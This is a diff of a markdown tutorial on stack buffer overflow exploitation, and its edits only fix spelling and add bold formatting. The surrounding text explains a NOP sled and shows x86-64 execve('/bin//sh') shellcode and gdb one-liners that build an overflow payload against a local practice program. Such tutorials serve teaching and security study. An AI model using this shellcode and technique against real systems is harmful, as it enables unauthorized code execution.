@@ -54,7 +54,7 @@ becuse if we can control rip we can point it to our malicious code.
 Lets Introduce the nop-sled:
 
 The NOOP instruction tells the CPU to do nothing and move to the next instruction.
-The nop sled is like: pincture boba fet falling into the sarlac pit.
+The nop sled is like: pincture Boba Fet falling into the Sarlacc pit.
 Anywhere we land into the middle of a nop-sled we end up in the same place.
 And in the end of the nop-sled we are going to put our shellcode.
 Then our main idea is to put a big enought nop-sled that takes almost all the buffer up to almost the address where rip is.
@@ -65,7 +65,7 @@ Again we run our inocent program with a bunch of nops
 Program received signal SIGSEGV, Segmentation fault.
 0x00007f0090909090 in ?? ()
 ```
-The same happens but the rip address not points to 0x00007f0090909090
+The same happens but the rip address not points to **0x00007f0090909090**
 
 We need to add to the end of the nop-sled our shellcode **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**
 
@@ -92,7 +92,7 @@ Appending it and executing our exploit again:
 Program received signal SIGSEGV, Segmentation fault.
 0x0000555555555173 in main ()
 ```
-As we can see the resulting address 0x0000555555555173 is not even in the stack range
+As we can see the resulting address **0x0000555555555173** is not even in the stack range
 we can check this with:
 
 ```
@@ -149,7 +149,7 @@ A +2 will suffice
 (gdb) run $(python -c 'print "\x90" * (524-23-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 ```
 
-Voila, we landed into the mouth of the sarlac, but why didnt our exploit worked at all?
+Voila, we landed into the mouth of the Sarlacc, but why didn't our exploit worked at all?
 
 ```
 (gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
